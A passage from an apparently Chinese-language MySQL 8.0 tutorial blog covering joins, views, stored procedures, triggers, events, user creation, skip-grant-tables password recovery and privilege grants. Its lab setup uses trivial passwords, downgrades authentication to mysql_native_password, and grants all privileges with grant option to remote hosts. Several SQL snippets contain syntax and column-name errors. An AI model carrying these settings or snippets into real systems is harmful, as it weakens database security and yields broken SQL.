alt="image-20220820113103772"></p><p>完全外连接：左连接+union+右连接，可以去重</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">##完全外连接，结合左外连接<span class="hljs-operator">+</span>右外连接，去重<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students s <span class="hljs-keyword">left</span> <span class="hljs-keyword">JOIN</span> teachers t <span class="hljs-keyword">on</span> s.TeacherID<span class="hljs-operator">=</span>t.TID<br><span class="hljs-keyword">union</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students s <span class="hljs-keyword">right</span> <span class="hljs-keyword">JOIN</span> teachers t <span class="hljs-keyword">on</span> s.TeacherID<span class="hljs-operator">=</span>t.TID;<br></code></pre></td></tr></table></figure><h3 id="自连接：自己表连接自己，筛选记录"><a href="#自连接：自己表连接自己，筛选记录" class="headerlink" title="自连接：自己表连接自己，筛选记录"></a>自连接：自己表连接自己，筛选记录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> emp (id <span class="hljs-type">int</span>,empname <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>),leaderid <span class="hljs-type">int</span>);<br><span class="hljs-keyword">desc</span> emp;<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> emp <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;magedu&#x27;</span>,<span class="hljs-keyword">null</span>),(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;wang&#x27;</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;zhang&#x27;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> emp;<br><span class="hljs-number">1</span>magedu<br><span class="hljs-number">2</span>wang<span class="hljs-number">1</span><br><span class="hljs-number">3</span>zhang<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>需求：查询每个人对应领导的名字，ID</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">##自己的表也可以配置两个别名<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> emp e <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> emp l <span class="hljs-keyword">on</span> e.id<span class="hljs-operator">=</span>l.leaderid<br><br>##自己的表也可以配置两个别名，跳出对应的列<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> emp e <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> emp l <span class="hljs-keyword">on</span> e.id<span class="hljs-operator">=</span>l.leaderid<br><br>##ifnull空函数，逻辑是员工表的领导ID<span class="hljs-operator">=</span>领导表他们自己的ID，先对应领导<br>##<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span>左连接，显示左表所有的值，如果是<span class="hljs-keyword">Inner</span> <span class="hljs-keyword">join</span>，则是显示一定有的，magedu就没了，不是交集，因为magedu没有leaderid<br><span class="hljs-keyword">select</span> e.name 员工姓名,IFNULL(l.name,<span class="hljs-string">&#x27;大boss&#x27;</span>) 领导姓名 <span class="hljs-keyword">from</span> emp e <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> emp l <span class="hljs-keyword">on</span> e.leaderid<span class="hljs-operator">=</span>l.id<br></code></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/2792175/202208/2792175-20220828181330720-1533465976.png" alt="image-20220820123128348"></p><h1 id="有关MySQL数据库的其他功能过程"><a href="#有关MySQL数据库的其他功能过程" class="headerlink" title="有关MySQL数据库的其他功能过程"></a>有关MySQL数据库的其他功能过程</h1><h2 id="1-视图view"><a href="#1-视图view" class="headerlink" title="1.视图view"></a>1.视图view</h2><p>功能作用：类似表，可以将一段查询语句的结果当做一个view来执行，后续可以查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">##创建视图<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">view</span> v_leader <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> e.name 员工姓名,IFNULL(l.name,<span class="hljs-string">&#x27;大boss&#x27;</span>) 领导姓名 <span class="hljs-keyword">from</span> emp e <span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> emp l <span class="hljs-keyword">on</span> e.leaderid<span class="hljs-operator">=</span>l.id<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> v_leader;<br><br>##删除视图<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">view</span> v_leader;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181330998-1234739629.png" alt="image-20220820162205130"></p><h2 id="2-存储过程procedure"><a href="#2-存储过程procedure" class="headerlink" title="2.存储过程procedure"></a>2.存储过程procedure</h2><p>类似脚本，主要是可以将进入到数据库内的操作先写成一系列的操作，是.sql的脚本，比如建库建表，插入数据等等，可以写类似while循环</p><p>里面类似function函数，声明一个变量i，每条语句都要加分号</p><p>结束符使用$$或者//都行，自定义的结束符，可以生成随机数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql">##创建表，生成<span class="hljs-number">10</span>w条记录<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">not</span> exist testlog (id <span class="hljs-type">int</span> auto_increment <span class="hljs-keyword">primary</span> key,name <span class="hljs-type">char</span>(<span class="hljs-number">10</span>),salary <span class="hljs-type">int</span> <span class="hljs-keyword">default</span> <span class="hljs-number">20</span>);<br><br>delimiter $$ ##定义结束符<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">procedure</span>  sp_testlog() <br><span class="hljs-keyword">begin</span>  <br><span class="hljs-keyword">declare</span> i <span class="hljs-type">int</span>;<br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <br>while i <span class="hljs-operator">&lt;=</span> <span class="hljs-number">100000</span> <br>do  <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testlog(name,salary) <span class="hljs-keyword">values</span> (concat(<span class="hljs-string">&#x27;wang&#x27;</span>,<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">100000</span>)),<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">1000000</span>)); <br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> i <span class="hljs-operator">+</span><span class="hljs-number">1</span>; <br><span class="hljs-keyword">end</span> while; <br><span class="hljs-keyword">end</span>$$<br><br>delimiter ;<br><br>##执行存储过程<br><span class="hljs-keyword">call</span> sp_testlog;<br><br>##查看表的记录<br><span class="hljs-keyword">show</span> tables;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><br>##查看库内的存储过程<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">procedure</span> status \G;<br></code></pre></td></tr></table></figure><h2 id="3-trigger触发器"><a href="#3-trigger触发器" class="headerlink" title="3.trigger触发器"></a>3.trigger触发器</h2><p>定义：当某个事件触发的时候(insert加数据，delete删除数据)，自动修改表内的数目，称为触发器trigger</p><p>注意：需要先在count表内归0，不然里面默认是NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">###创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span> student_info(<br>stu_id <span class="hljs-type">int</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">PRIMARY</span> key auto_increment ,<br>stu_name <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">null</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span> stu_count(<br>stu_count <span class="hljs-type">int</span> <span class="hljs-keyword">default</span> <span class="hljs-number">0</span><br>);<br><br>##查看测试表<br><span class="hljs-keyword">show</span> tables;<br><br>##创建<span class="hljs-keyword">trigger</span>，加减的触发器，每新加一条记录(<span class="hljs-keyword">each</span> <span class="hljs-type">row</span>)，count就会<span class="hljs-operator">+</span><span class="hljs-number">1</span>；每减少一条记录，count就会<span class="hljs-number">-1</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> trigger_incre<br>after <span class="hljs-keyword">insert</span><br><span class="hljs-keyword">on</span> student_info <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-type">row</span><br><span class="hljs-keyword">update</span> stu_count <span class="hljs-keyword">set</span> stu_count<span class="hljs-operator">=</span>stu_count<span class="hljs-operator">+</span><span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">trigger</span> trigger_decre<br>after <span class="hljs-keyword">delete</span> <br><span class="hljs-keyword">on</span> student_info <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-type">row</span><br><span class="hljs-keyword">update</span> stu_count <span class="hljs-keyword">set</span> stu_count<span class="hljs-operator">=</span>stu_count<span class="hljs-number">-1</span>;<br><br>##查看库内的触发器个数<br><span class="hljs-keyword">show</span> triggers;<br><br>##查询表内的内容，也可以写存储过程批量化的插入表记录<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student_info;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> stu_count;<br><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> student_info <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;mary&#x27;</span>)，(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;mary&#x27;</span>)，(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;mary&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> stu_count <span class="hljs-keyword">values</span>(<span class="hljs-number">0</span>);<br><br>##<span class="hljs-keyword">delete</span>，会自动减少count的值.<span class="hljs-keyword">where</span>查询后<span class="hljs-keyword">delete</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> student_info <span class="hljs-keyword">where</span> stu_id<span class="hljs-operator">&gt;=</span><span class="hljs-number">2</span>;<br><br>##清空表<br><span class="hljs-keyword">truncate</span> stu_count;<br><span class="hljs-keyword">truncate</span> student_info;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181331259-1724389273.png" alt="image-20220820170205345"></p><h2 id="4-EVENT事件—计划任务"><a href="#4-EVENT事件—计划任务" class="headerlink" title="4.EVENT事件—计划任务"></a>4.EVENT事件—计划任务</h2><p>show variables like event-schduler</p><p>可以定时执行对应的任务操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">##开启event事件调度，定时执行任务<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@event</span>_scheduler; <span class="hljs-keyword">ON</span><br><span class="hljs-keyword">show</span> processlist;<br></code></pre></td></tr></table></figure><h1 id="MySQL用户管理权限"><a href="#MySQL用户管理权限" class="headerlink" title="MySQL用户管理权限"></a>MySQL用户管理权限</h1><p>系统默认账户，可以新创建用户，指定某些IP段可以访问</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">[mysql]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.infoschema <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.session    <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.sys        <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>flush privileges;<br></code></pre></td></tr></table></figure><h2 id="在MySQL的skip-grant-tables下修改密码"><a href="#在MySQL的skip-grant-tables下修改密码" class="headerlink" title="在MySQL的skip-grant-tables下修改密码"></a>在MySQL的skip-grant-tables下修改密码</h2><p>当忘记了MySQL的密码后，需要在my.cnf的[mysqld]上面添加一个skip-grant-tables来跳过密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">vim /etc/my.cnf<br>#skip-grant-tables<br>systemctl restart mysqld<br></code></pre></td></tr></table></figure><p>进入到数据库后，发现更改密码的操作无法执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">(root@localhost) [(none)]&gt;alter user root@&#x27;localhost&#x27; identified by &#x27;123&#x27;;<br>ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement<br></code></pre></td></tr></table></figure><p>需要直接去更改表操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sql">##之前的报错<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> authentication_string<span class="hljs-operator">=</span>password<span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;root&#x27;</span>;<br>ERROR <span class="hljs-number">1064</span> (<span class="hljs-number">42000</span>): You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-number">123456</span><span class="hljs-string">&#x27; where user=&#x27;</span>root<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span><br><br><span class="hljs-comment">---&gt;这个其实是mysql8.0之前的写法，后续8.0不使用=password这样的写法了</span><br><br><br>##查询一下这个表的东西，可以看到，不同的<span class="hljs-keyword">user</span><span class="hljs-variable">@host</span>的密码是不同的；如果需要改root要先区分好改哪个root，是本地root还是远程root<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host,authentication_string <span class="hljs-keyword">from</span> mysql.user;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+------------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span> authentication_string                                                  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+------------------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span> $A$<span class="hljs-number">005</span>$G]@&quot;&gt;|wLG%Oe3PK61VSgxpemuc0kWZZt87GwaA0XbsKK1M4DumIT8rKijO2 |<br>| catyer           | 10.0.0.%  | *23AE809DDACAF96AF0FD78ED04B6A265E05AA257                              |<br>| mysql.infoschema | localhost | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |<br>| mysql.session    | localhost | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |<br>| mysql.sys        | localhost | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |<br><br>##mysql8.0修改默认密码<br>1.设置为空<br>update user set authentication_string=&#x27;&#x27; where user=root<br><br>2.将配置文件内的skip注释掉，重启服务<br>vim /etc/my.cnf<br>#skip-grant-tables<br>systemctl restart mysqld<br><br>3.使用空密码登录到DB<br>mysql<br><br>4.修改本地用户密码<br>alter user root@&#x27;localhost&#x27; identified by &#x27;123&#x27;;<br>flush privileges;<br><br>5.登录<br>mysql -uroot -p123<br></code></pre></td></tr></table></figure><h2 id="解决MySQL8-0无法使用远程登录的问题caching-sha2-password"><a href="#解决MySQL8-0无法使用远程登录的问题caching-sha2-password" class="headerlink" title="解决MySQL8.0无法使用远程登录的问题caching_sha2_password"></a>解决MySQL8.0无法使用远程登录的问题caching_sha2_password</h2><p>在创建好一个用户后，因为MySQL8.0默认的密码策略，导致我们一时间没法直接连接，出现这个报错</p><p><img src="2792175-20220828181331530-961936863.png" alt="image-20220821081454735"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">ERROR 2059 (HY000): Authentication plugin &#x27;caching_sha2_password&#x27; cannot be loaded: /usr/lib64/mysql/plugin/caching_sha2_password.so: cannot open shared object file: No such file or directory<br></code></pre></td></tr></table></figure><p>原因就在于：8.0默认使用的认证方式是caching_sha2_password，我们设置的密码过于简单，实验环境下，需要在指定给远程用户的时候写上</p><p>在8.0以前(5.7、5.6等)，都是mysql_native_password这个参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> <br><br>##查看默认的认证插件<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;default_authentication_plugin&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-operator">|</span> Variable_name                 <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-operator">|</span> default_authentication_plugin <span class="hljs-operator">|</span> caching_sha2_password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------------------+-----------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##最佳做法：可以在赋予密码的时候，加上mysql_native_password，记住这种写法，需要设置简单密码的时候，能不改全局尽量不改全局<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password  <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>flush privileges;<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;wpuser&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> privileges <span class="hljs-keyword">on</span> wordpress.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;wpuser&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> option;<br><br>##登录尝试成功<br>mysql <span class="hljs-operator">-</span>ucatyer <span class="hljs-operator">-</span>p123 <span class="hljs-operator">-</span>h10<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.132</span><br>Warning: <span class="hljs-keyword">Using</span> a password <span class="hljs-keyword">on</span> the command line interface can be insecure.<br>Welcome <span class="hljs-keyword">to</span> the MySQL monitor.  Commands <span class="hljs-keyword">end</span> <span class="hljs-keyword">with</span> ; <span class="hljs-keyword">or</span> \g.<br>Your MySQL connection id <span class="hljs-keyword">is</span> <span class="hljs-number">9</span><br>Server version: <span class="hljs-number">8.0</span><span class="hljs-number">.30</span> MySQL Community Server <span class="hljs-operator">-</span> GPL<br></code></pre></td></tr></table></figure><h2 id="MySQL用户业务数据库授权"><a href="#MySQL用户业务数据库授权" class="headerlink" title="MySQL用户业务数据库授权"></a>MySQL用户业务数据库授权</h2><p>授权某个库的管理员操作权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs sql">##先看下每个用户的权限<br>Grant_priv：具有授权的权限<br>Super_priv：拥有超级权限<br><br><span class="hljs-keyword">SELECT</span> host,<span class="hljs-keyword">user</span>,Grant_priv,Super_priv <span class="hljs-keyword">FROM</span> mysql.user;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------------+------------+------------+</span><br><span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> Grant_priv <span class="hljs-operator">|</span> Super_priv <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------------+------------+------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span> Y          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>  <span class="hljs-operator">|</span> catyer           <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> mysql.infoschema <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> mysql.session    <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span> Y          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> mysql.sys        <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span> N          <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> Y          <span class="hljs-operator">|</span> Y          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------------+------------+------------+</span><br><span class="hljs-number">6</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##授权操作，还得是本地localhost用户来，Navicat是远程用户，不具备授权能力<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> zabbix.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br><br><span class="hljs-keyword">grant</span> (操作权限:<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">create</span>,delete...) <span class="hljs-keyword">on</span> db.table_name <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;user&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span><br><br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb(代表哪个库).<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb.students <span class="hljs-keyword">to</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>; ##授权只能访问修改这个表，可以给别的开发使用，细粒度的授权<br><span class="hljs-keyword">show</span> tables;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> Tables_in_hellodb <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-operator">|</span> students          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##授权远程用户有授权能力，可以在navicat内编辑<br><span class="hljs-keyword">update</span> mysql.user 